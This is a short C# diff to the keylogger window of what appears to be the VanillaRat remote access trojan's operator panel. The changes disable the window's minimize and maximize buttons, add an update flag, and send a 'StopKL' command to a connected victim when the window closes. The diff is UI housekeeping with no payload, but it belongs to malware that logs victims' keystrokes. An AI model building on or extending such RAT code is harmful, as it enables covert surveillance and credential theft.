@@ -9,13 +9,18 @@ namespace VanillaRat.Forms
         public Keylogger()
         {
             InitializeComponent();
+            MinimizeBox = false;
+            MaximizeBox = false;
+            Update = true;
         }
 
         public int ConnectionId { get; set; }
+        public bool Update { get; set; }
 
-        //Stop keylogger 
+        //Stop keylogger
         private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
         {
+            Update = false;
             Server.MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopKL"));
         }
     }
